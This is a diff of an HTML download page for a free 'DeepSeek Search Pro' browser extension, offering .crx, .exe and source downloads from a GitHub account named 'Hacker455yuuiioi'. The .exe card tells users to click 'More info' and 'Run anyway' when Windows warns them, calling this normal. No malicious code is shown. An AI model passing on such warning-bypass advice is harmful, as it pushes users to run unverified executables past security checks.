@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>DeepSeek Search Pro - Search All Your Conversations</title>
-  <meta name="description" content="Free extension to search all your DeepSeek conversations. One-click Windows installer available!">
+  <meta name="description" content="Free extension to search all your DeepSeek conversations. One-click Windows installer, direct .crx download, and source code available!">
   
   <style>
     * {
@@ -30,7 +30,7 @@
     /* Header */
     header {
       text-align: center;
-      margin-bottom: 60px;
+      margin-bottom: 40px;
     }
 
     .logo {
@@ -77,165 +77,187 @@
       margin: 0 auto;
     }
 
-    /* Main Content */
-    .main-content {
+    /* Status Badge */
+    .status-badge {
+      background: rgba(255,255,255,0.15);
+      backdrop-filter: blur(10px);
+      border-radius: 50px;
+      padding: 10px 20px;
+      display: inline-block;
+      margin: 20px 0;
+      border: 1px solid #FFE55C;
+    }
+
+    .status-badge span {
+      color: #FFE55C;
+      font-weight: bold;
+    }
+
+    /* Download Section */
+    .download-section {
+      text-align: center;
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(10px);
+      border-radius: 30px;
+      padding: 40px;
+      margin: 40px 0;
+      border: 2px solid #FFE55C;
+    }
+
+    .download-grid {
       display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 40px;
-      margin-bottom: 60px;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 30px;
+      margin-top: 30px;
+    }
+
+    .download-card {
+      background: white;
+      border-radius: 20px;
+      padding: 30px;
+      color: #1f2937;
+      text-align: left;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    }
+
+    .download-icon {
+      font-size: 48px;
+      margin-bottom: 20px;
+    }
+
+    .download-title {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      color: #1f2937;
+    }
+
+    .download-desc {
+      color: #6b7280;
+      margin-bottom: 20px;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .btn {
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-size: 15px;
+      font-weight: 600;
+      text-decoration: none;
+      transition: all 0.3s;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: none;
+      cursor: pointer;
+      width: 100%;
+      margin: 8px 0;
+    }
+
+    .btn-primary {
+      background: #10a37f;
+      color: white;
+    }
+
+    .btn-primary:hover {
+      background: #0e8c6d;
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(16, 163, 127, 0.3);
+    }
+
+    .btn-secondary {
+      background: #e5e7eb;
+      color: #1f2937;
+    }
+
+    .btn-secondary:hover {
+      background: #d1d5db;
+      transform: translateY(-2px);
+    }
+
+    .file-info {
+      font-size: 11px;
+      color: #9ca3af;
+      margin-top: 15px;
+      font-family: monospace;
+      word-break: break-all;
+      background: #f3f4f6;
+      padding: 8px;
+      border-radius: 5px;
+    }
+
+    .warning-box {
+      background: #fff3cd;
+      border-left: 4px solid #ffc107;
+      padding: 15px;
+      border-radius: 10px;
+      margin: 20px 0 0 0;
+      text-align: left;
+    }
+
+    .warning-box h4 {
+      color: #856404;
+      margin-bottom: 10px;
+      font-size: 14px;
+    }
+
+    .warning-box ol {
+      margin-left: 20px;
+      color: #856404;
+      font-size: 13px;
+    }
+
+    .warning-box code {
+      background: #ffe69c;
+      padding: 2px 5px;
+      border-radius: 3px;
+    }
+
+    /* Features Grid */
+    .features-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 30px;
+      margin: 60px 0;
     }
 
     .feature-card {
       background: rgba(255,255,255,0.1);
       backdrop-filter: blur(10px);
-      border-radius: 30px;
-      padding: 40px;
+      border-radius: 20px;
+      padding: 30px;
       border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .feature-icon {
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+
+    .feature-title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 15px;
     }
 
     .feature-list {
       list-style: none;
     }
 
-    .feature-item {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      padding: 15px 0;
+    .feature-list li {
+      padding: 8px 0;
       border-bottom: 1px solid rgba(255,255,255,0.1);
-      font-size: 18px;
-    }
-
-    .feature-item:last-child {
-      border-bottom: none;
-    }
-
-    .feature-item:before {
-      content: "✓";
-      background: #10a37f;
-      color: white;
-      width: 24px;
-      height: 24px;
-      border-radius: 50%;
       display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
-      flex-shrink: 0;
-    }
-
-    /* Download Section */
-    .download-section {
-      text-align: center;
-      background: rgba(255,255,255,0.15);
-      backdrop-filter: blur(10px);
-      border-radius: 30px;
-      padding: 50px;
-      margin: 40px 0;
-      border: 2px solid #FFE55C;
-    }
-
-    .download-badge {
-      background: #FFE55C;
-      color: #1f2937;
-      padding: 8px 20px;
-      border-radius: 30px;
-      font-weight: bold;
-      display: inline-block;
-      margin-bottom: 20px;
-    }
-
-    .download-title {
-      font-size: 36px;
-      margin-bottom: 20px;
-    }
-
-    .download-buttons {
-      display: flex;
-      gap: 20px;
-      justify-content: center;
-      flex-wrap: wrap;
-      margin: 30px 0;
-    }
-
-    .btn {
-      padding: 18px 36px;
-      border-radius: 50px;
-      font-size: 18px;
-      font-weight: 600;
-      text-decoration: none;
-      transition: all 0.3s;
-      display: inline-flex;
       align-items: center;
       gap: 10px;
-      border: none;
-      cursor: pointer;
     }
 
-    .btn-primary {
-      background: #10a37f;
-      color: white;
-      box-shadow: 0 10px 20px rgba(16, 163, 127, 0.3);
-    }
-
-    .btn-primary:hover {
-      background: #0e8c6d;
-      transform: translateY(-2px);
-      box-shadow: 0 15px 30px rgba(16, 163, 127, 0.4);
-    }
-
-    .btn-secondary {
-      background: rgba(255,255,255,0.2);
-      color: white;
-      border: 1px solid rgba(255,255,255,0.3);
-    }
-
-    .btn-secondary:hover {
-      background: rgba(255,255,255,0.3);
-      transform: translateY(-2px);
-    }
-
-    .btn i {
-      font-size: 24px;
-    }
-
-    .file-info {
-      font-size: 14px;
-      color: rgba(255,255,255,0.7);
-      margin-top: 15px;
-    }
-
-    .file-info span {
-      background: rgba(255,255,255,0.1);
-      padding: 5px 10px;
-      border-radius: 5px;
-      font-family: monospace;
-    }
-
-    /* Stats Section */
-    .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 30px;
-      margin: 60px 0;
-      text-align: center;
-    }
-
-    .stat-item {
-      background: rgba(255,255,255,0.1);
-      border-radius: 20px;
-      padding: 30px;
-    }
-
-    .stat-number {
-      font-size: 48px;
-      font-weight: 700;
-      color: #FFE55C;
-    }
-
-    .stat-label {
-      font-size: 16px;
-      opacity: 0.9;
+    .feature-list li:before {
+      content: "✓";
+      color: #10a37f;
+      font-weight: bold;
     }
 
     /* Installation Steps */
@@ -248,9 +270,9 @@
     }
 
     .steps h2 {
-      color: #1f2937;
       margin-bottom: 30px;
-      font-size: 28px;
+      text-align: center;
+      color: #1f2937;
     }
 
     .step-grid {
@@ -261,7 +283,6 @@
 
     .step {
       text-align: center;
-      padding: 20px;
     }
 
     .step-number {
@@ -289,6 +310,32 @@
       font-size: 14px;
     }
 
+    /* Stats */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 30px;
+      margin: 40px 0;
+      text-align: center;
+    }
+
+    .stat-item {
+      background: rgba(255,255,255,0.1);
+      border-radius: 20px;
+      padding: 30px;
+    }
+
+    .stat-number {
+      font-size: 36px;
+      font-weight: 700;
+      color: #FFE55C;
+    }
+
+    .stat-label {
+      font-size: 14px;
+      opacity: 0.9;
+    }
+
     /* Footer */
     footer {
       text-align: center;
@@ -302,25 +349,33 @@
       justify-content: center;
       gap: 30px;
       margin-bottom: 20px;
+      flex-wrap: wrap;
     }
 
     .footer-links a {
       color: white;
       text-decoration: none;
       opacity: 0.8;
+      transition: opacity 0.3s;
     }
 
     .footer-links a:hover {
       opacity: 1;
     }
 
+    .extension-id {
+      font-size: 12px;
+      opacity: 0.6;
+      margin-top: 10px;
+      font-family: monospace;
+    }
+
     /* Responsive */
     @media (max-width: 768px) {
       h1 { font-size: 36px; }
-      .main-content { grid-template-columns: 1fr; }
-      .stats-grid { grid-template-columns: 1fr; }
       .step-grid { grid-template-columns: 1fr; }
-      .download-buttons { flex-direction: column; }
+      .stats-grid { grid-template-columns: 1fr; }
+      .download-grid { grid-template-columns: 1fr; }
     }
   </style>
 </head>
@@ -333,61 +388,78 @@
       </div>
       <h1>DeepSeek Search Pro</h1>
       <div class="subtitle">Search all your DeepSeek conversations - instantly and free</div>
+      <div class="status-badge">
+        <span>✅ COMPLETELY FREE</span> • No paywalls • Open source
+      </div>
     </header>
 
-    <!-- Download Section - Prominent -->
+    <!-- Main Download Section -->
     <div class="download-section">
-      <div class="download-badge">🎉 NEW: One-Click Windows Installer!</div>
-      <h2 class="download-title">Install in 2 Minutes</h2>
-      <p style="font-size: 18px; margin-bottom: 20px;">No technical skills required - just download and run!</p>
-      
-      <div class="download-buttons">
-        <!-- Windows Installer (Recommended) -->
-        <a href="https://github.com/Hacker455yuuiioi/deepseek-payment-site/raw/main/DeepSeekSearchPro_Setup.exe" 
-           class="btn btn-primary" 
-           download>
-          <span style="font-size: 24px;">⬇️</span>
-          Download for Windows (.exe)
-        </a>
-        
-        <!-- GitHub Source -->
-        <a href="https://github.com/Hacker455yuuiioi/deepseek-payment-site" 
-           class="btn btn-secondary" 
-           target="_blank">
-          <span style="font-size: 24px;">📦</span>
-          View Source on GitHub
-        </a>
-      </div>
-      
-      <div class="file-info">
-        <span>DeepSeekSearchPro_Setup.exe</span> • 1.5 MB • Version 2.1.0
-      </div>
-    </div>
+      <h2 style="font-size: 32px; margin-bottom: 10px; color: white;">📥 Download Extension</h2>
+      <p style="font-size: 18px; margin-bottom: 30px; color: rgba(255,255,255,0.9);">Choose your preferred installation method</p>
 
-    <!-- Features -->
-    <div class="main-content">
-      <div class="feature-card">
-        <h2 style="font-size: 28px; margin-bottom: 20px;">✨ Features</h2>
-        <ul class="feature-list">
-          <li class="feature-item">Search across ALL conversations</li>
-          <li class="feature-item">Find keywords inside messages</li>
-          <li class="feature-item">Click results to jump to chats</li>
-          <li class="feature-item">Keywords highlighted in yellow</li>
-          <li class="feature-item">Search bar at top-right corner</li>
-          <li class="feature-item">Works with Chrome, Edge, Opera, Brave</li>
-        </ul>
-      </div>
+      <div class="download-grid">
+        <!-- Option 1: CRX Direct Install (Recommended for Chrome users) -->
+        <div class="download-card">
+          <div class="download-icon">⚡</div>
+          <div class="download-title">Direct Install (.crx)</div>
+          <div class="download-desc">For Chrome, Edge, Brave, Opera users. Drag and drop to install.</div>
+          <a href="deepseek-search-extension.crx" 
+             class="btn btn-primary" 
+             download="DeepSeekSearchPro.crx">
+            ⬇️ Download .crx (7 KB)
+          </a>
+          <div class="file-info">deepseek-search-extension.crx</div>
+          <div class="warning-box">
+            <h4>📋 Installation Instructions:</h4>
+            <ol>
+              <li>Download the .crx file</li>
+              <li>Open Chrome and go to <code>chrome://extensions</code></li>
+              <li>Enable <strong>"Developer mode"</strong> (top-right toggle)</li>
+              <li>Drag and drop the .crx file onto the page</li>
+              <li>Click <strong>"Add extension"</strong></li>
+            </ol>
+          </div>
+        </div>
 
-      <div class="feature-card">
-        <h2 style="font-size: 28px; margin-bottom: 20px;">🆓 Completely Free</h2>
-        <ul class="feature-list">
-          <li class="feature-item">No paywalls - ever</li>
-          <li class="feature-item">No registration required</li>
-          <li class="feature-item">Open source on GitHub</li>
-          <li class="feature-item">Anonymous usage stats only</li>
-          <li class="feature-item">Regular updates</li>
-          <li class="feature-item">Community supported</li>
-        </ul>
+        <!-- Option 2: Windows Installer (Easiest for non-technical users) -->
+        <div class="download-card">
+          <div class="download-icon">🪟</div>
+          <div class="download-title">Windows Installer (.exe)</div>
+          <div class="download-desc">One-click installer for Windows users. No technical knowledge needed!</div>
+          <a href="DeepSeekSearchPro_Setup.exe" 
+             class="btn btn-primary" 
+             download>
+            ⬇️ Download .exe (2 MB)
+          </a>
+          <div class="file-info">DeepSeekSearchPro_Setup.exe</div>
+          <div class="warning-box">
+            <h4>⚠️ If Windows shows a warning:</h4>
+            <ol>
+              <li>Click <strong>"More info"</strong></li>
+              <li>Click <strong>"Run anyway"</strong></li>
+              <li>This is normal for new software</li>
+            </ol>
+          </div>
+        </div>
+
+        <!-- Option 3: Source Code (For developers) -->
+        <div class="download-card">
+          <div class="download-icon">📦</div>
+          <div class="download-title">Source Code</div>
+          <div class="download-desc">For developers who want to inspect code or install manually.</div>
+          <a href="https://github.com/Hacker455yuulioi/deepseek-payment-site/archive/refs/heads/main.zip" 
+             class="btn btn-secondary" 
+             target="_blank">
+            📥 Download ZIP (Source)
+          </a>
+          <a href="https://github.com/Hacker455yuulioi/deepseek-payment-site" 
+             class="btn btn-secondary" 
+             target="_blank">
+            🌐 View on GitHub
+          </a>
+          <div class="file-info">Includes all extension files + README</div>
+        </div>
       </div>
     </div>
 
@@ -407,50 +479,76 @@
       </div>
     </div>
 
-    <!-- Installation Steps -->
+    <!-- Features -->
+    <div class="features-grid">
+      <div class="feature-card">
+        <div class="feature-icon">🔍</div>
+        <div class="feature-title">Powerful Search</div>
+        <ul class="feature-list">
+          <li>Search ALL conversations</li>
+          <li>Find keywords inside messages</li>
+          <li>Case-sensitive option</li>
+          <li>Whole word matching</li>
+        </ul>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon">🎯</div>
+        <div class="feature-title">Smart Features</div>
+        <ul class="feature-list">
+          <li>Click results to jump to chats</li>
+          <li>Keywords highlighted in yellow</li>
+          <li>Search bar at top-right corner</li>
+          <li>Works with all DeepSeek chats</li>
+        </ul>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon">🆓</div>
+        <div class="feature-title">Completely Free</div>
+        <ul class="feature-list">
+          <li>No paywalls - ever</li>
+          <li>No registration required</li>
+          <li>Open source on GitHub</li>
+          <li>Anonymous usage stats only</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- Quick Install Steps -->
     <div class="steps">
-      <h2>📥 How to Install (2 Minutes)</h2>
+      <h2>📋 Quick Install (2 Minutes)</h2>
       <div class="step-grid">
         <div class="step">
           <div class="step-number">1</div>
-          <div class="step-title">Download Installer</div>
-          <div class="step-desc">Click the green button above to download DeepSeekSearchPro_Setup.exe</div>
+          <div class="step-title">Download</div>
+          <div class="step-desc">Choose .crx (Chrome) or .exe (Windows) above</div>
         </div>
         <div class="step">
           <div class="step-number">2</div>
-          <div class="step-title">Run the Installer</div>
-          <div class="step-desc">Double-click the downloaded file and follow the simple wizard</div>
+          <div class="step-title">Install</div>
+          <div class="step-desc">Follow the instructions for your chosen method</div>
         </div>
         <div class="step">
           <div class="step-number">3</div>
           <div class="step-title">Restart Browser</div>
-          <div class="step-desc">Close and reopen Chrome/Edge - the extension appears automatically!</div>
+          <div class="step-desc">Close and reopen Chrome/Edge - extension appears!</div>
         </div>
       </div>
-    </div>
-
-    <!-- Manual Installation for Tech Users -->
-    <div style="background: rgba(0,0,0,0.2); border-radius: 20px; padding: 30px; margin: 30px 0;">
-      <h3 style="margin-bottom: 15px;">🔧 For Developers / Advanced Users</h3>
-      <p style="margin-bottom: 15px;">Prefer manual installation? You can load the extension in Developer Mode:</p>
-      <ol style="margin-left: 20px; line-height: 1.8;">
-        <li>Download the ZIP from GitHub</li>
-        <li>Extract to a folder</li>
-        <li>Go to chrome://extensions</li>
-        <li>Enable "Developer mode"</li>
-        <li>Click "Load unpacked" and select the folder</li>
-      </ol>
     </div>
 
     <!-- Footer -->
     <footer>
       <div class="footer-links">
-        <a href="https://github.com/Hacker455yuuiioi/deepseek-payment-site">GitHub</a>
+        <a href="https://github.com/Hacker455yuulioi/deepseek-payment-site" target="_blank">GitHub</a>
         <a href="info.html">About</a>
         <a href="mailto:robernjuguna254@gmail.com">Contact</a>
         <a href="privacy.html">Privacy</a>
       </div>
       <p>© 2026 DeepSeek Search Pro • Created by Robert Njuguna</p>
+      <div class="extension-id">
+        Extension ID: fpdalljanofnljhjoalggbgpmpepjktf
+      </div>
     </footer>
   </div>
 </body>
